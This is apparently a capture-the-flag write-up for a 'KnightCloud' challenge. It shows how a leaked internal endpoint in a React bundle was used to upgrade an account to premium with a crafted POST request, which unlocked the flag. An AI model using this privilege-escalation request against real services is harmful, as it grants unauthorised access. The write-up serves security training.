#### KnightCloud
- points earned: 100
#### Notes / Intuition
- After creating an account and loggin in, I took a look at the source code.  Looks like a react app.
- I scrolled through `index-<>.js` and found the block below which seemed curious
	```js
	examples: {
	        upgradeUserExample: {
	            endpoint: "/api/internal/v1/migrate/user-tier",
	            method: "POST",
	            body: {
	                u: "user-uid-here",
	                t: "premium"
	            },
	            validTiers: ["free", "premium", "enterprise"]
	        }
	    },
	```
- Based on this information, I created a request for `/api/internal/v1/migrate/user-tier` and fired it off.
	```http
	POST /api/internal/v1/migrate/user-tier HTTP/1.1
	Host: 23.239.26.112:8091
	Content-Type: application/json
	
	{"u":"cb710562-6e5c-4536-8615-940bf71d321c","t":"premium"}
	```
- I refreshed the dashboard page and the previously disabled sections were now enabled.
- `Load Analytics` led to the flag.

#### Solution
1. Send a request to `/api/internal/v1/migrate/user-tier` to escalate privileges on the account.
2. Send a request to `GET /api/premium/analytics` to capture the flag.